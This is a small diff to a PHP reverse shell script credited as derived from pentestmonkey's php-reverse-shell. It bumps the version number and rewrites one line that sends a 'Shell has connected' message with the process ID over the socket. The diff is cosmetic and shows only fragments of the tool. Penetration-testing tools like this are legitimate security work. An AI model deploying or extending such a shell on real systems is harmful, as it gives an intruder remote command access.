@@ -1,6 +1,6 @@
 <?php
 // Copyright (c) 2020 Ivan Šincek
-// v2.3
+// v2.4
 // Requires PHP v5.0.0 or greater.
 // Works on Linux OS, macOS, and Windows OS.
 // See the original script at https://github.com/pentestmonkey/php-reverse-shell.
@@ -124,7 +124,7 @@ class Shell {
 
                     // ----- WORK BEGIN -----
                     $status = proc_get_status($process);
-                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
+                    @fwrite($socket, "SOCKET: Shell has connected! PID: ${status['pid']}\n");
                     do {
 						$status = proc_get_status($process);
                         if (feof($socket)) { // check for end-of-file on SOCKET
